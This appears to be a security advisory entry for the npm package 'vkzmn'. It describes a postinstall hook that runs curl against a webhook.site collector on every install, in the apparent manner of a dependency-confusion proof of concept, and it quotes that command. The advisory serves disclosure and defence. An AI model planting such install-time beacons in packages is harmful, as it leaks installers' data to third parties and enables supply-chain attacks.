summary: vkzmn postinstall beacons installer to webhook.site collector
details: package.json declares a postinstall lifecycle script that runs `curl https://webhook.site/75e67bec-b667-4cfe-af87-6d3bdc24b0dc` on every `npm install`. The package ships no functional code (empty description/author, manifest-only) and lists itself as a dependency (`vkzmn: ^1.0.4`), matching the structural shape of a dependency-confusion / namespace-squat proof of concept. Installing this package causes the host to make an unconsented outbound HTTP request to a third-party collection endpoint, leaking install events (source IP, timing, and any data the collector chooses to log) to a destination unrelated to any declared package purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
